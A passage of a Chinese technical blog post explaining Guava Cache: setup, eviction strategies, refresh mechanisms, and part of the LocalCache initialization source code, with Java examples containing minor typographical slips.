ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>Guava Cache 是非常强大的本地缓存工具，提供了非常简单 API 供开发者使用。</p>
<p>这篇文章，我们将详细介绍 Guava Cache 的<strong>基本用法</strong>、<strong>回收策略</strong>，<strong>刷新策略</strong>，<strong>实现原理</strong>。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1572c65f3de0436f8f1a21328a917bbc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=QbWrfMtgTCTdG%2BcaHjKwEz4AT%2Bg%3D" alt="图片" loading="lazy"/></p>
<h2 data-id="heading-0">1 基本用法</h2>
<h3 data-id="heading-1">1.1 依赖配置</h3>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.google.guava<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>guava<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>31.0.1-jre<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<h3 data-id="heading-2">1.1 创建缓存</h3>
<p>Guava Cache 提供了基于 Builder 构建者模式的构造器，用户只需要根据需求设置好各种参数即可使用。</p>
<p><strong>1、手工创建缓存对象</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-keyword">@Test</span>
public void testHandCache() {
      <span class="hljs-comment">// 测试手工测试</span>
      Cache&lt;String, String&gt; cache = CacheBuilder<span class="hljs-selector-class">.newBuilder</span>().
              <span class="hljs-comment">// 最大容量为20（基于容量进行回收）</span>
                      <span class="hljs-built_in">maximumSize</span>(<span class="hljs-number">20</span>)
              <span class="hljs-comment">// 配置写入后多久未更新，缓存会过期</span>
              <span class="hljs-selector-class">.expireAfterWrite</span>(<span class="hljs-number">10</span>, TimeUnit.SECONDS)<span class="hljs-selector-class">.build</span>();
      cache<span class="hljs-selector-class">.put</span>("hello", "value_HELLO");
      <span class="hljs-built_in">assertEquals</span>("value_HELLO", cache.getIfPresent("hello"));
      Thread<span class="hljs-selector-class">.sleep</span>(<span class="hljs-number">10000</span>);
      <span class="hljs-comment">// 过期后重新获取 </span>
      <span class="hljs-built_in">assertNull</span>(cache.getIfPresent("hello"));
}
</code></pre>
<p>我们可以创建一个缓存对象 Cache ，通过 CacheBuilder 构造器，配置相关参数（最大容量 20 个条目、缓存过期时间 10 秒），最后调用构建方法。</p>
<p><strong>2、创建缓存加载器</strong></p>
<p>CacheLoader 可以理解为一个固定的加载器，在创建 Cache 对象时指定，然后简单地重写 <code>V load(K key) throws Exception</code> 方法，就可以达到当检索不存在的时候，会自动的加载数据。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testLoadingCache</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException {
      CacheLoader&lt;String, String&gt; cacheLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;String, String&gt;() {
          <span class="hljs-comment">//自动写缓存数据的方法</span>
          <span class="hljs-meta">@Override</span>
          <span class="hljs-keyword">public</span> String <span class="hljs-title function_">load</span><span class="hljs-params">(String key)</span> {
              System.out.println(<span class="hljs-string">"加载 key:"</span> + key);
              <span class="hljs-keyword">return</span><span class="hljs-string">"value_"</span> + key.toUpperCase();
          }
          <span class="hljs-meta">@Override</span>
          <span class="hljs-comment">//重新刷新缓存</span>
          <span class="hljs-keyword">public</span> ListenableFuture&lt;String&gt; <span class="hljs-title function_">reload</span><span class="hljs-params">(String key, String oldValue)</span> <span class="hljs-keyword">throws</span> Exception {
              returnsuper.reload(key, oldValue);
          }
      };

      LoadingCache&lt;String, String&gt; cache =
              CacheBuilder.newBuilder()
                      <span class="hljs-comment">// 最大容量为100（基于容量进行回收）</span>
                      .maximumSize(<span class="hljs-number">20</span>)
                      <span class="hljs-comment">// 配置写入后多久未更新，缓存会过期</span>
                      .expireAfterWrite(<span class="hljs-number">10</span>, TimeUnit.SECONDS)
                      <span class="hljs-comment">//配置写入后多久刷新缓存</span>
                      .refreshAfterWrite(<span class="hljs-number">1</span>, TimeUnit.SECONDS).build(cacheLoader);
        assertEquals(<span class="hljs-number">0</span>, cache.size());
        assertEquals(<span class="hljs-string">"value_HELLO"</span>, cache.getUnchecked(<span class="hljs-string">"hello"</span>));
        assertEquals(<span class="hljs-number">1</span>, cache.size());

     <span class="hljs-comment">// 通过 Callable 获取数据</span>
       <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"mykey"</span>;
       <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(key, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Callable</span>&lt;String&gt;() {
          <span class="hljs-meta">@Override</span>
           <span class="hljs-keyword">public</span> String <span class="hljs-title function_">call</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
               <span class="hljs-keyword">return</span><span class="hljs-string">"call_"</span> + key;
          }
        });
       System.out.println(<span class="hljs-string">"call value:"</span> + value);
}
</code></pre>
<p>和手工创建缓存对象不同，我们首先创建缓存加载器对象，并重写 load 方法，然后通过缓存构造器创建 LoadingCache 对象 ，该对象支持写入后刷新方法。</p>
<p>同时 LoadingCache 对象支持 Callable 模式，也就是调用 get 方法时，可以传入 Callable 对象。这样可以在使用缓存时，更加灵活。</p>
<h2 data-id="heading-3">2 回收策略</h2>
<p>Guava Cache 提供了三种基本的缓存回收方式：</p>
<ul>
<li>基于容量回收策略</li>
<li>基于时间的回收策略</li>
<li>基于引用回收策略</li>
</ul>
<h3 data-id="heading-4">2.1 基于容量回收策略</h3>
<p>基于容量的回收策略可以分为两种：<strong>基于大小</strong>和<strong>基于权重</strong>。</p>
<p><strong>基于大小</strong>：我们可以使用 <code>maximumSize</code> 方法设置最大缓存项数量，当缓存项数量达到设定的最大值时，旧的缓存项将会被移除。</p>
<pre><code class="hljs language-ini" lang="ini">Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
    .maximumSize(100)
    .build()<span class="hljs-comment">;</span>
</code></pre>
<p><strong>基于权重</strong>：如果不同的缓存值，需要占据不同的内存空间，也就是不同的缓存项有不同的“权重”（weights）。</p>
<p>我们可以使用 <code>CacheBuilder.weigher(Weigher)</code> 指定一个权重函数，并且用 <code>maximumWeight(long)</code> 指定最大总重。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">Cache</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt; cache = <span class="hljs-title class_">CacheBuilder</span>.<span class="hljs-title function_">newBuilder</span>()
    .<span class="hljs-title function_">maximumWeight</span>(<span class="hljs-number">1000</span>)
    .<span class="hljs-title function_">weigher</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Weigher</span>&lt;<span class="hljs-title class_">Object</span>, <span class="hljs-title class_">Object</span>&gt;() {
        <span class="hljs-keyword">public</span> int <span class="hljs-title function_">weigh</span>(<span class="hljs-params"><span class="hljs-built_in">Object</span> key, <span class="hljs-built_in">Object</span> value</span>) {
            <span class="hljs-comment">// 定义权重计算方法</span>
            <span class="hljs-keyword">return</span> value.<span class="hljs-title function_">size</span>();
        }
    }).<span class="hljs-title function_">build</span>();
</code></pre>
<h3 data-id="heading-5">2.2 基于时间的回收策略</h3>
<p>我们可以使用 <code>expireAfterAccess</code> 和 <code>expireAfterWrite</code> 方法设置缓存项的最大存活时间。</p>
<ul>
<li><code>expireAfterAccess</code> 表示缓存项在给定时间内没有被读/写访问会过期。</li>
<li><code>expireAfterWrite</code> 表示缓存项在被创建或最后一次更新后的指定时间内会过期。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss">Cache&lt;<span class="hljs-selector-tag">Object</span>, <span class="hljs-selector-tag">Object</span>&gt; cache = CacheBuilder<span class="hljs-selector-class">.newBuilder</span>()
    <span class="hljs-comment">// 10分钟没有访问后会被回收，或者重新加载</span>
    <span class="hljs-selector-class">.expireAfterAccess</span>(<span class="hljs-number">10</span>, TimeUnit.MINUTES)
    <span class="hljs-comment">// 5分钟没有更新,缓存会被回收，或者重新加载</span>
    <span class="hljs-comment">// .expireAfterWrite(5,TimeUnit.MINUTES)</span>
<span class="hljs-selector-class">.build</span>();
</code></pre>
<h3 data-id="heading-6">2.3 基于引用回收策略</h3>
<p>Guava Cache 提供了以下三个方法来配置基于引用的回收策略：</p>
<ol>
<li>
<p><strong>weakKeys() 方法：</strong></p>
<p>通过调用 <code>weakKeys()</code> 方法，可以使缓存中的键使用弱引用。这意味着如果某个键没有其他强引用指向它，那么该键可能会被垃圾回收，并且相应的缓存项也会被移除。</p>
</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">   Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
       .weakKeys()
       .build()<span class="hljs-comment">;</span>
</code></pre>
<ol>
<li>
<p><strong>weakValues() 方法：</strong></p>
<p>通过调用 <code>weakValues()</code> 方法，可以使缓存中的值使用弱引用。这样，如果某个值没有其他强引用指向它，那么该值可能会被垃圾回收，相应的缓存项也会被移除。</p>
</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">   Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
       .weakValues()
       .build()<span class="hljs-comment">;</span>
</code></pre>
<ol>
<li>
<p><strong>softValues() 方法：</strong></p>
<p>通过调用 <code>softValues()</code> 方法，可以使缓存中的值使用软引用。软引用相对于弱引用，更倾向于在内存不足时被垃圾回收。如果某个值没有其他强引用指向它，且内存不足时，该值可能会被垃圾回收，相应的缓存项也会被移除。</p>
</li>
</ol>

<pre><code class="hljs language-ini" lang="ini">   Cache&lt;Object, Object&gt; <span class="hljs-attr">cache</span> = CacheBuilder.newBuilder()
       .softValues()
       .build()<span class="hljs-comment">;</span>
</code></pre>
<p>一般来讲，我们在生产环境使用的是(<strong>基于容量回收策略 + 基于时间的回收策略</strong>)两者配合来使用。</p>
<p>当然 ，我们同样可以使用<strong>手工回收</strong>的方式。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title class_">Cache</span>&lt;<span class="hljs-title class_">String</span>,<span class="hljs-title class_">String</span>&gt; cache = <span class="hljs-title class_">CacheBuilder</span>.<span class="hljs-title function_">newBuilder</span>().<span class="hljs-title function_">build</span>();
<span class="hljs-title class_">Object</span> value = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">"key1"</span>,<span class="hljs-string">"value1"</span>);
cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">"key2"</span>,<span class="hljs-string">"value2"</span>);
cache.<span class="hljs-title function_">put</span>(<span class="hljs-string">"key3"</span>,<span class="hljs-string">"value3"</span>);

<span class="hljs-comment">//1.清除指定的key</span>
cache.<span class="hljs-title function_">invalidate</span>(<span class="hljs-string">"key1"</span>);

<span class="hljs-comment">//2.批量清除list中全部key对应的记录</span>
<span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; list = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;<span class="hljs-title class_">String</span>&gt;();
list.<span class="hljs-title function_">add</span>(<span class="hljs-string">"key1"</span>);
list.<span class="hljs-title function_">add</span>(<span class="hljs-string">"key2"</span>);
cache.<span class="hljs-title function_">invalidateAll</span>(list);
</code></pre>
<h2 data-id="heading-7">3 刷新策略</h2>
<h3 data-id="heading-8">3.1 手工刷新</h3>
<p>我们可以强制缓存加载器重新加载键的新值，调用 LoadingCache 对象的刷新方法。</p>
<pre><code class="hljs language-ini" lang="ini">String <span class="hljs-attr">value</span> = loadingCache.get(<span class="hljs-string">"key"</span>)<span class="hljs-comment">;</span>
loadingCache.refresh("key")<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-9">3.2 自动刷新</h3>
<p>Guava Cache 提供了刷新（refresh）机制，可以通过 <code>refreshAfterWrite</code> 方法来设置刷新时间，当缓存项过期的同时可以重新加载新值。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">Cache</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; cache = <span class="hljs-title class_">CacheBuilder</span>.<span class="hljs-title function_">newBuilder</span>()
    .<span class="hljs-title function_">refreshAfterWrite</span>(<span class="hljs-number">5</span>, <span class="hljs-title class_">TimeUnit</span>.<span class="hljs-property">MINUTES</span>)
     <span class="hljs-comment">// 设置并发级别为3，并发级别是指可以同时写缓存的线程数</span>
    .<span class="hljs-title function_">concurrencyLevel</span>(<span class="hljs-number">3</span>)
    .<span class="hljs-title function_">build</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">load</span>(<span class="hljs-title class_">String</span> key) throws <span class="hljs-title class_">Exception</span> {
            <span class="hljs-comment">// 异步加载新值的逻辑</span>
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetchDataFromDataSource</span>(key);
        }
    });
<span class="hljs-comment">// 在获取缓存值时，如果缓存项过期，将返回旧值 </span>
<span class="hljs-title class_">String</span> value = cache.<span class="hljs-title function_">get</span>(<span class="hljs-string">"exampleKey"</span>);
</code></pre>
<p>配置刷新方法 <code>refreshAfterWrite</code>，当大量线程同时访问缓存项，缓存已过期时，更新线程调用 load 方法更新该缓存，其他请求线程并不需要等待，框架直接返回该缓存项的旧值。</p>
<p>因为更新线程同时也是请求线程，所以在上面的示例代码里面，刷新缓存是个同步操作，可不可以异步的加载缓存呢 ？</p>
<p>我们有两种方式：<strong>异步加载缓存的原理是重写 reload 方法</strong>。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Test</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAnsynRefreshMethod1</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> InterruptedException, ExecutionException {
      <span class="hljs-type">ExecutorService</span> <span class="hljs-variable">executorService</span> <span class="hljs-operator">=</span> Executors.newFixedThreadPool(<span class="hljs-number">5</span>);
      CacheLoader&lt;String, String&gt; cacheLoader = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;String, String&gt;() {
          <span class="hljs-comment">//自动写缓存数据的方法</span>
          <span class="hljs-meta">@Override</span>
          <span class="hljs-keyword">public</span> String <span class="hljs-title function_">load</span><span class="hljs-params">(String key)</span> {
              System.out.println(Thread.currentThread().getName() + <span class="hljs-string">" 加载 key:"</span> + key);
              <span class="hljs-comment">// 从数据库加载数据</span>
              <span class="hljs-keyword">return</span><span class="hljs-string">"value_"</span> + key.toUpperCase();
          }

          <span class="hljs-meta">@Override</span>
          <span class="hljs-comment">//异步刷新缓存</span>
          <span class="hljs-keyword">public</span> ListenableFuture&lt;String&gt; <span class="hljs-title function_">reload</span><span class="hljs-params">(String key, String oldValue)</span> <span class="hljs-keyword">throws</span> Exception {
              ListenableFutureTask&lt;String&gt; futureTask = ListenableFutureTask.create(() -&gt; {
                  System.out.println(Thread.currentThread().getName() + <span class="hljs-string">" 异步加载 key:"</span> + key + <span class="hljs-string">" oldValue:"</span> + oldValue);
                  Thread.sleep(<span class="hljs-number">1000</span>);
                  <span class="hljs-keyword">return</span> load(key);
              });
              executorService.submit(futureTask);
              <span class="hljs-keyword">return</span> futureTask;
          }
      };

      LoadingCache&lt;String, String&gt; cache = CacheBuilder.newBuilder()
              <span class="hljs-comment">// 最大容量为20（基于容量进行回收）</span>
              .maximumSize(<span class="hljs-number">20</span>)
              <span class="hljs-comment">//配置写入后多久刷新缓存</span>
              .refreshAfterWrite(<span class="hljs-number">2</span>, TimeUnit.SECONDS).build(cacheLoader);

       <span class="hljs-type">String</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> <span class="hljs-string">"hello"</span>;
       <span class="hljs-comment">// 第一次加载</span>
       <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> cache.get(key);
       System.out.println(value);
       Thread.sleep(<span class="hljs-number">3000</span>);
      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {
          executorService.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Runnable</span>() {
              <span class="hljs-meta">@Override</span>
              <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> {
                  <span class="hljs-keyword">try</span> {
                      <span class="hljs-type">String</span> <span class="hljs-variable">value2</span> <span class="hljs-operator">=</span> cache.get(key);
                      System.out.println(Thread.currentThread().getName() + value2);
                      <span class="hljs-comment">// 第二次加载</span>
                  } <span class="hljs-keyword">catch</span> (Exception e) {
                       e.printStackTrace();
                  }
              }
          });
      }
      Thread.sleep(<span class="hljs-number">20000</span>);
}
</code></pre>
<p>或者使用更优雅的使用方式：</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-title class_">ExecutorService</span> executorService = <span class="hljs-title class_">Executors</span>.<span class="hljs-title function_">newFixedThreadPool</span>(<span class="hljs-number">5</span>);
<span class="hljs-title class_">CacheLoader</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt; cacheLoader = <span class="hljs-title class_">CacheLoader</span>.<span class="hljs-title function_">asyncReloading</span>(
           <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheLoader</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">String</span>&gt;() {
                  <span class="hljs-comment">//自动写缓存数据的方法</span>
                  <span class="hljs-meta">@Override</span>
                  <span class="hljs-keyword">public</span> <span class="hljs-title class_">String</span> <span class="hljs-title function_">load</span>(<span class="hljs-params"><span class="hljs-built_in">String</span> key</span>) {
                      <span class="hljs-title class_">System</span>.<span class="hljs-property">out</span>.<span class="hljs-title function_">println</span>(<span class="hljs-title class_">Thread</span>.<span class="hljs-title function_">currentThread</span>().<span class="hljs-title function_">getName</span>() + <span class="hljs-string">" 加载 key:"</span> + key);
                      <span class="hljs-comment">// 从数据库加载数据</span>
                      <span class="hljs-keyword">return</span> <span class="hljs-string">"value_"</span> + key.<span class="hljs-title function_">toUpperCase</span>();
                  }
            } , executorService);
</code></pre>
<p>自动刷新的缺点是：当缓存项到了指定过期时间，不管是同步刷新还是异步刷新，绝大部分请求线程都会返回旧的数据值，缓存值会有一定的延迟效果。</p>
<p>所以一般场景下，使用<code>efreshAfterWrite</code>和 <code>expireAfterWrite</code>配合使用 。</p>
<p>比如说控制缓存每1秒进行刷新，如果超过 2s 没有访问，那么则让缓存失效，访问时不会得到旧值，而是必须得待新值加载。</p>
<h2 data-id="heading-10">4 实现原理</h2>
<p>Guava Cache 的数据结构跟 JDK1.7 的 ConcurrentHashMap 类似，如下图所示：</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7c665ac18e3447c288a6af718ab15597~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSmF2Yee8lueoi-eIseWlveiAhQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768286698&amp;x-signature=tfwT8zNEbtb5kf%2Fuoultv4KV%2Bn8%3D" alt="图片" loading="lazy"/></p>
<h3 data-id="heading-11">4.1 构造函数</h3>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">public</span> &lt;<span class="hljs-variable constant_">K1</span> <span class="hljs-keyword">extends</span> K, <span class="hljs-variable constant_">V1</span> <span class="hljs-keyword">extends</span> V&gt; <span class="hljs-title class_">LoadingCache</span>&lt;<span class="hljs-variable constant_">K1</span>, <span class="hljs-variable constant_">V1</span>&gt; <span class="hljs-title function_">build</span>(<span class="hljs-params">
      CacheLoader&lt;? <span class="hljs-variable language_">super</span> K1, V1&gt; loader</span>) {
   <span class="hljs-title function_">checkWeightWithWeigher</span>();
   <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalCache</span>.<span class="hljs-property">LocalLoadingCache</span>&lt;&gt;(<span class="hljs-variable language_">this</span>, loader);
}
</code></pre>
<p>通过构造器 <code>CacheBuilder</code> 的构建方法创建本地缓存类 <code>LocalCache</code> 的静态包装类 <code>LocalLoadingCache</code>对象。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">LocalCache</span>&lt;K, V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractMap</span>&lt;K, V&gt; <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConcurrentMap</span>&lt;K, V&gt; {
   <span class="hljs-comment">// ..... 省略代码 </span>
   staticclass LocalLoadingCache&lt;K, V&gt; <span class="hljs-keyword">extends</span> <span class="hljs-title class_">LocalManualCache</span>&lt;K, V&gt;
      <span class="hljs-keyword">implements</span> <span class="hljs-title class_">LoadingCache</span>&lt;K, V&gt; {
    
    LocalLoadingCache(
        CacheBuilder&lt;? <span class="hljs-built_in">super</span> K, ? <span class="hljs-built_in">super</span> V&gt; builder, CacheLoader&lt;? <span class="hljs-built_in">super</span> K, V&gt; loader) {
      <span class="hljs-built_in">super</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalCache</span>&lt;K, V&gt;(builder, checkNotNull(loader)));
    }
    <span class="hljs-comment">// LoadingCache methods</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">get</span><span class="hljs-params">(K key)</span> <span class="hljs-keyword">throws</span> ExecutionException {
      <span class="hljs-keyword">return</span> localCache.getOrLoad(key);
    }
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> V <span class="hljs-title function_">getUnchecked</span><span class="hljs-params">(K key)</span> {
      <span class="hljs-keyword">try</span> {
        <span class="hljs-keyword">return</span> get(key);
      } <span class="hljs-keyword">catch</span> (ExecutionException e) {
        thrownew <span class="hljs-title function_">UncheckedExecutionException</span><span class="hljs-params">(e.getCause()</span>);
      }
    }
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> ImmutableMap&lt;K, V&gt; <span class="hljs-title function_">getAll</span><span class="hljs-params">(Iterable&lt;? extends K&gt; keys)</span> <span class="hljs-keyword">throws</span> ExecutionException {
      <span class="hljs-keyword">return</span> localCache.getAll(keys);
    }
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">refresh</span><span class="hljs-params">(K key)</span> {
      localCache.refresh(key);
    }
   <span class="hljs-comment">// ..... 省略代码 </span>
  }
}
</code></pre>
<p><code>LocalLoadingCache</code> 类对外暴露了若干方法，它的底层依然是 <code>LocalCache</code> 对象来执行相关缓存操作，<code>LocalCache</code> 本质上就是一个 Map 。</p>
<h3 data-id="heading-12">4.2 初始化缓存</h3>
<pre><code class="hljs language-ini" lang="ini">LocalCache(
      CacheBuilder&lt;? super K, ? super V&gt; builder, @Nullable CacheLoader&lt;? super K, V&gt; loader) {
    <span class="hljs-attr">concurrencyLevel</span> = Math.min(builder.getConcurrencyLevel(), MAX_SEGMENTS)<span class="hljs-comment">;</span>
    // key的强度，即引用类型的强弱
    <span class="hljs-attr">keyStrength</span> = builder.getKeyStrength()<span class="hljs-comment">;</span>
    // value的强度，即引用类型的强弱
    <span class="hljs-attr">valueStrength</span> = builder.getValueStrength()<span class="hljs-comment">;</span>
    // key的比较策略，跟key的引用类型有关
    <span class="hljs-attr">keyEquivalence</span> = builder.getKeyEquivalence()<span class="hljs-comment">;</span>
    // value的比较策略，跟value的引用类型有关
    <span class="hljs-attr">valueEquivalence</span> = builder.getValueEquivalence()<span class="hljs-comment">;</span>

    <span class="hljs-attr">maxWeight</span> = builder.getMaximumWeight()<span class="hljs-comment">;</span>
    <span class="hljs-attr">weigher</span> = builder.getWeigher()<span class="hljs-comment">;</span>
    //访问后的过期时间，设置了expireAfterAccess参数
    <span class="hljs-attr">expireAfterAccessNanos</span> = builder.getExpireAfterAccessNanos()<span class="hljs-comment">;</span>
     //写入后的过期时间，设置了expireAfterWrite参数
    <span class="hljs-attr">expireAfterWriteNanos</span> = builder.getExpireAfterWriteNanos()<span class="hljs-comment">;</span>
    <span class="hljs-attr">refreshNanos</span> = builder.getRefreshNanos()<span class="hljs-comment">;</span>

    int <span class="hljs-attr">initialCapacity</span> = Math.min(builder.getInitialCapacity(), MAXIMUM_CAPACITY)<span class="hljs-comment">;</span>
    if (evictsBySize() &amp;&amp; !customWeigher()) {
      <span class="hljs-attr">initialCapacity</span> = (int) Math.min(initialCapacity, maxWeight)<span class="hljs-comment">;</span>
    }
    // Find the lowest power-of-two segmentCount that exceeds concurrencyLevel, unless
    // maximumSize/Weight is specified in which case ensure that each segment gets at least 10
    // entries. The special casing for size-based eviction is only necessary because that eviction
    // happens per segment instead of globally, so too many segments compared to the maximum size
    // will result in random eviction behavior.
    int <span class="hljs-attr">segmentShift</span> = <span class="hljs-number">0</span><span class="hljs-comment">;</span>
    int <span class="hljs-attr">segmentCount</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
    while (segmentCount &lt; concurrencyLevel &amp;&amp; (!evictsBySize() || segmentCount * 20 &lt;= maxWeight)) {
      ++segmentShift<span class="hljs-comment">;</span>
      segmentCount &lt;&lt;= 1<span class="hljs-comment">;</span>
    }
    <span class="hljs-attr">this.segmentShift</span> = <span class="hljs-number">32</span> - segmentShift<span class="hljs-comment">;</span>
    <span class="hljs-attr">segmentMask</span> = segmentCount - <span class="hljs-number">1</span><span class="hljs-comment">;</span>

    <span class="hljs-attr">this.segments</span> = newSegmentArray(segmentCount)<span class="hljs-comment">;</span>
    
    int <span class="hljs-attr">segmentCapacity</span> = initialCapacity / segmentCount<span class="hljs-comment">;</span>
    if (segmentCapacity * segmentCount &lt; initialCapacity) {
      ++segmentCapacity<span class="hljs-comment">;</span>
    }
    int <span class="hljs-attr">segmentSize</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
    while (segmentSize &lt; segmentCapacity) {
      segmentSize &lt;&lt;= 1<span class="hljs-comment">;</span>
    }
    if (evictsBySize()) {
      // Ensure sum of segment max <span class="hljs-attr">weights</span> = overall max weights
      long <span class="hljs-attr">maxSegmentWeight</span> = maxWeight / segmentCount + <span class="hljs-number">1</span><span class="hljs-comment">;</span>
      long <span class="hljs-attr">remainder</span> = maxWeight % segmentCount<span class="hljs-comment">;</span>
      for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; this.segments.length; ++i) {</span>
        if (<span class="hljs-attr">i</span> == remainder) {
          maxSegmentWeight--<span class="hljs-comment">;</span>
        }
        this.segments<span class="hljs-section">[i]</span> =
            createSegment(segmentSize, maxSegmentWeight, builder.getStatsCounterSupplier().get())<span class="hljs-comment">;</span>
      }
    } else {
      for (int <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; this.segments.length; ++i) {</span>
        this.segments<span class="hljs-section">[i]</span> =
            createSegment(segmentSize, UNSET_INT, builder.getStatsCounterSupplier().get())<span class="hljs-comment">;</span>
      }
    }
}
</code></pre>
<p><code>LocalCache</code> 维护一个 Segment 数组，数组大小满足如下条件：</p>
<ol>
